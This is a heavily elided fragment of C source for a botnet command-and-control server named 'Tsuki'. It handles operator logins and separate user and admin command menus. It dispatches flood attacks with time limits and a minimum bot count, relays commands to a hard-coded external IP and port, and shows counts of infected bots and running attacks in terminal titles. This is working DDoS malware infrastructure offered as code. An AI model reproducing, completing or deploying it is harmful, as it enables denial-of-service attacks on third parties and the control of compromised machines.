...
char *user_commands[USER_COMMANDS][2] = {
    ...
    {"  .handshake", "   3-way handshake (SYN, SYN-ACK, and ACK) to establish a reliable, bi-directional communication channel"},
...
char *admin_commands[ADMIN_COMMANDS][2] = {
    {"\r\nattacks <enable/disable>", "enable or disable the use of ongoin attacks"},
...
int broadcast_command(char *sendbuf, int maxcount, int maxtime, int myfd, char *floods, char *user, int admin_mode)
{
    ...
    if (arguments[0 + maxcnt])
    {
        ...
        if (atk_found == 0)
        {
            ...
            memset(tmpbuf, 0, sizeof(tmpbuf));
            free(arguments);
            write(myfd, "\x1b[1;37mYour attack method is unknown!\r\n", strlen("\x1b[1;37mYour attack method is unknown!\r\n"));
            return 0;
        }
    ...
    if (arguments[2 + maxcnt])
    {
        ...
        if (atk_time > maxtime || atk_time > 86400)
        {
            ...
            memset(tmpbuf, 0, sizeof(tmpbuf));
            free(arguments);
            write(myfd, "\x1b[1;37mYou must stick within your attack time limit!\r\n", strlen("\x1b[1;37mYou must stick within your attack time limit!\r\n"));
            return 0;
        }
    }
    ...
    sockaddr.sin_port = htons(1520);
    sockaddr.sin_addr.s_addr = inet_addr("95.214.27.3");

    if (connect(fd, (struct sockaddr *)&sockaddr, sizeof (struct sockaddr_in)) == -1)
    {
        close(fd);
        write(myfd, "\x1b[1;37mFailed to attack, please make sure listener is screened.\r\n", strlen("\x1b[1;37mFailed to attack, please make sure listener is screened.\r\n"));
        return 0;
    }
    ...
    {
        close(fd);
        write(myfd, "\x1b[1;37mThe API has failed to build your command.\r\n", strlen("\x1b[1;37mThe API has failed to build your command.\r\n"));
        return 0;
    }
    ...
    if (sentto == 410)
    {
        sprintf(prompt, "\x1b[1;37mCan not start attacks with less than 1 bot\r\n");
        for (i = 0; i < args_len; i++)
            free(arguments[i]);
...
{
    char banner[256];
    sprintf(banner, "\x1b[34m          \r\n");
    send(myfd, banner, strlen(banner), MSG_NOSIGNAL);
    sprintf(banner, "\x1b[34m                        .--. \r\n");
    send(myfd, banner, strlen(banner), MSG_NOSIGNAL);
    sprintf(banner, "\x1b[34m                       |\x1b[37;01mo\x1b[34m_\x1b[37;01mo\x1b[34m | \r\n");
    send(myfd, banner, strlen(banner), MSG_NOSIGNAL);
    sprintf(banner, "\x1b[34m                       |:_/ | \r\n");
    send(myfd, banner, strlen(banner), MSG_NOSIGNAL);
    sprintf(banner, "\x1b[34m                      //   \\ \\\r\n");
    send(myfd, banner, strlen(banner), MSG_NOSIGNAL);
    sprintf(banner, "\x1b[34m                     (|     | ) \r\n");
    send(myfd, banner, strlen(banner), MSG_NOSIGNAL);
    sprintf(banner, "\x1b[34m                    /'\\ _  _/`\\ \r\n");
    send(myfd, banner, strlen(banner), MSG_NOSIGNAL);
    sprintf(banner, "\x1b[34m                    \\___)=(___/ \r\n");
    send(myfd, banner, strlen(banner), MSG_NOSIGNAL);
    send(myfd, "\n", strlen("\n"), MSG_NOSIGNAL);
...
void *tab_title_admin(void *arg)
{
    ...
    for(i = 0; i < MAXFDS; i++)
    {
        ...
        sprintf(title, "\033]0;Tsuki - Loaded: %d | Sessions: %d | %d/%d RealTime Attacks\007", botcount, usercount, attkcount, MAX_ATTACKS);
...
void *tab_title_user(void *arg)
{
    ...
    for(i = 0; i < MAXFDS; i++)
    {
        ...
        sprintf(title, "\033]0;Tsuki - Loaded: %d | %d/%d RealTime Attacks\007", botcount, attkcount, MAX_ATTACKS);
            ...
            else if (listen_fd == events[i].data.fd)
            {
                while (1)
                {
                    ...
                    for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) // check for duplicate clients by seeing if any have the same IP as the one connecting
                    {
                        ...
                        {
                            printf("[cnc] Duplicate \x1b[31mDeleted \x1b[37m%d.%d.%d.%d (bot id %s)\n", clients[event.data.fd].ip & 0xff, (clients[event.data.fd].ip >> 8) & 0xff, (clients[event.data.fd].ip >> 16) & 0xff, (clients[event.data.fd].ip >> 24) & 0xff, clients[event.data.fd].arch);
                            close(event.data.fd);
...
void *detect_afk(void *arg)
{
    ...
    while(1)
    {
        ...
        {
            char fbuf[512];
            sprintf(fbuf, "It's been a while since you've sent a cmd, logging you out to save resources ;)\n");
            write(the_fd, fbuf, strlen(fbuf));
...
void *controller_thread(void *arg)
{
    ...
    write(accinfo[cfd].fd, "\x1b[1;37mUsername\x1b[97m -> ", strlen("\x1b[1;37mUsername\x1b[97m -> "));
    read(accinfo[cfd].fd, username, sizeof(username));
    write(accinfo[cfd].fd, "\x1b[1;37mPassword\x1b[97m -> ", strlen("\x1b[1;37mPassword\x1b[97m -> "));
    ...
    write(accinfo[cfd].fd, "\033[?1049h\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n", strlen("\033[?1049h") + 16);
        ...
        if (accinfo[cfd].admin == 1)
            sprintf(prompt, "\x1b[1;37m%s\x1b[34m@\x1b[1;37mTsuki \x1b[34m> \033[1;37m", username);
        else
            sprintf(prompt, "\x1b[1;37m%s\x1b[34m@\x1b[1;37mTsuki \x1b[34m> \033[0m", username);
    ...
    while (memset(rdbuf, 0, sizeof(rdbuf)) && read(accinfo[cfd].fd, rdbuf, sizeof(rdbuf)) > 0)
    {
        ...
        */
        ...
        {
            write(accinfo[cfd].fd, "\x1b[32mGoodbye\r\n", strlen("\x1b[32mGoodbye\r\n"));
        ...
        else if ((strcmp(rdbuf, "online") == 0 || strcmp(rdbuf, "o") == 0) && accinfo[cfd].admin == 1)
        {
            char tempbuf[2048];
            int f;
            for(f = 0; f < MAXFDS; f++)
